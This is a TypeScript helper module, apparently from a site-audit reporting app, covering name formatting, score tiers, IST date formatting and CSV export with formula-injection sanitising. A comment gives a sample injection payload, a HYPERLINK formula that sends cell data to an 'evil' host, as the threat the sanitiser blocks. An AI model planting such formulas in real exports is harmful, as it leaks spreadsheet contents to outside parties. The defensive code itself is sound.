/**
 * A human-readable display name derived from an email's local part, since
 * accounts have no separate name field. "venkat.r@edstellar.com" -> "Venkat R",
 * "jane_doe@x.com" -> "Jane Doe". Falls back to the raw email if it has no
 * local part.
 */
export function displayNameFromEmail(email: string): string {
  const local = (email || "").split("@")[0];
  if (!local) return email || "";
  return local
    .split(/[.\-_]+/)
    .filter(Boolean)
    .map((part) => part.charAt(0).toUpperCase() + part.slice(1))
    .join(" ");
}

// Single source of truth for score tiering: scoreColor() (on-screen badges)
// and scoreLabel() (CSV/Excel export, lib/reportExport.ts) used to have
// independently-drifted thresholds (90/70/50 vs 90/75/50), so a score of
// 72-74 rendered "good" on screen but exported as "Needs Attention".
export const SCORE_THRESHOLDS = { excellent: 90, good: 70, needsAttention: 50 };

export function scoreColor(score: number): string {
  if (score >= SCORE_THRESHOLDS.excellent) return "#10B981";
  if (score >= SCORE_THRESHOLDS.good) return "#0369A1";
  if (score >= SCORE_THRESHOLDS.needsAttention) return "#D97706";
  return "#DC2626";
}

export function scoreLabel(score: number): string {
  if (score >= SCORE_THRESHOLDS.excellent) return "Excellent";
  if (score >= SCORE_THRESHOLDS.good) return "Good";
  if (score >= SCORE_THRESHOLDS.needsAttention) return "Needs Attention";
  return "Critical";
}

export function severityColor(severity: string): { text: string; bg: string } {
  const s = (severity || "").toLowerCase();
  if (s === "critical") return { text: "var(--sev-critical)", bg: "var(--sev-critical-bg)" };
  if (s === "high") return { text: "var(--sev-high)", bg: "var(--sev-high-bg)" };
  if (s === "warning") return { text: "var(--sev-warning)", bg: "var(--sev-warning-bg)" };
  if (s === "medium") return { text: "var(--sev-medium)", bg: "var(--sev-medium-bg)" };
  return { text: "var(--sev-low)", bg: "var(--sev-low-bg)" };
}

// All displayed timestamps are rendered in IST (Asia/Kolkata) with a fixed
// en-IN locale. Fixing both the time zone AND the locale (rather than using the
// viewer's `toLocaleString()`) also makes the output deterministic between the
// server render and the client, removing a hydration-mismatch source.
const IST_DATE_FORMAT = new Intl.DateTimeFormat("en-IN", {
  dateStyle: "medium",
  timeStyle: "short",
  timeZone: "Asia/Kolkata",
});

export function formatDate(iso: string | null): string {
  if (!iso) return "N/A";
  try {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return iso;
    return `${IST_DATE_FORMAT.format(d)} IST`;
  } catch {
    return iso;
  }
}

const FORMULA_TRIGGER_CHARS = ["=", "+", "-", "@"];

/**
 * Neutralize CSV/Excel formula injection. Page-controlled strings (titles,
 * anchor text, image names, issue text, ...) are exported verbatim into CSV
 * cells; if such a value starts with a formula-trigger character, Excel/
 * Sheets may interpret it as a formula when the export is later opened
 * (e.g. a page whose title is `=HYPERLINK("http://evil/?"&A1,"x")`).
 * Prefixing with a single quote forces spreadsheet apps to treat it as
 * literal text. Mirrors modules/report_generator.py's `_sanitize_cell`.
 */
export function sanitizeCsvCell(value: unknown): string {
  const s = String(value ?? "");
  return FORMULA_TRIGGER_CHARS.some((c) => s.startsWith(c)) ? `'${s}` : s;
}

export function downloadCsv(filename: string, rows: string[][]) {
  const csv = rows
    .map((row) => row.map((cell) => `"${sanitizeCsvCell(cell).replace(/"/g, '""')}"`).join(","))
    .join("\n");
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
